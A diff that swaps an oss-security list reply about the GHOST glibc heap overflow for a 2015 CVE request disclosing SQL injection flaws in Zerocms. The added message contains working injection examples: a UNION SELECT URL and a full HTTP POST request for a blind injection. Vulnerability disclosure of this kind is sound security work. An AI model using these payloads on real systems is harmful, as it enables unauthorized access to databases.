@@ -1,38 +1,64 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/29/2
-Message-ID: <CALoOobPZ9D+TYTE=EtU8pRMdN-YqwkhhZNDYEMO7Fo_As208-A@mail.gmail.com>
-Date: Wed, 28 Jan 2015 22:20:18 -0800
-From: Paul Pluzhnikov <ppluzhnikov@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/01/3
+Message-ID: <CALH-=7wpmvfhuGbL2MB+-9GcS+3Wgz5VJuuZ=f-FcpQWUzWT0w@mail.gmail.com>
+Date: Sun, 1 Feb 2015 09:15:03 +0100
+From: Steffen Rösemann <steffen.roesemann1986@...il.com>
 To: oss-security@...ts.openwall.com
-Cc: yunlian@...gle.com
-Subject: Re: GHOST gethostbyname() heap overflow in glibc (CVE-2015-0235)
+Subject: CVE-Request -- Zerocms <= v. 1.3.3 -- SQL injection vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Jan 28, 2015 at 3:04 AM, Hanno Böck <hanno@...eck.de> wrote:
+Hi Steve, Josh, vendors, list.
 
-> I'm CC-ing the committer. Maybe we can shed some light on this.
->
-> Two people having fixed this in different places without crying alarm -
-> it's worrying.
+I found two SQL injection vulnerabilities in Zerocms <= v. 1.3.3.
 
-I used to maintain GLIBC that is used in Google production.
+The first SQL injection vulnerability is located in the article_id
+parameter used in zero_view_article.php and can be exploited even by
+unauthenticated attackers.
 
-An internal bug report (b/14129807) was filed on 2014/04/17 when a
-Googler noticed that gethostname("000...0") (with a 1000 zeros)
-resulted in a buffer overflow detected by address sanitizer.
+See the following exploit-example:
 
-I didn't investigate whether the bug is exploitable or not (I just
-assume that all buffer overflows should be patched). I simply noticed
-that upstream has already fixed the issue, and so we backported the
-patch as we routinely do for other buffer overflows.
+http://
+{TARGET}/views/zero_view_article.php?article_id=-1+union+select+database%28%29,2,version%28%29,user%28%29,5,6+--+
 
-Chromium team also got notified about the internal bug, and applied
-the patch as well.
+The second vulnerability is a Blind SQL injection an is located in the
+user_id parameter used in a POST request in zero_transact_user.php.
 
-If I was supposed to cry alarm, I would have to cry alarm every time
-there is a buffer overflow in glibc, which doesn't seem very useful.
+An attacker can exploit this vulnerabilitiy in the administrative backend
+via the following POST request exploit-example:
 
-Cheers,
+POST /views/zero_transact_user.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0)
+Gecko/20100101 Firefox/35.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://{TARGET}/views/zero_user_account.php?user_id=2
+Cookie: PHPSESSID=rirftt07h0dem8d48lujliuve6
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
 
--- 
-Paul Pluzhnikov
+name=user&email=user%40user.de&access_level=1&user_id=2 {SQL injection goes
+here}&action=Modify+Account
+
+Could you please assign a CVE-ID for this?
+
+Thank you very much.
+
+Greetings from Germany.
+
+Steffen Rösemann
+
+References:
+
+[1] http://aas9.in/zerocms/
+[2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-13.html
+[3] https://github.com/perezkarjee/zerocms/issues/3
+[4] https://github.com/sroesemann/zerocms
+[5] https://twitter.com/sroesemann/status/559273548691546113
+[6]
+http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-14.html
+[7] http://seclists.org/fulldisclosure/2015/Feb/4
+
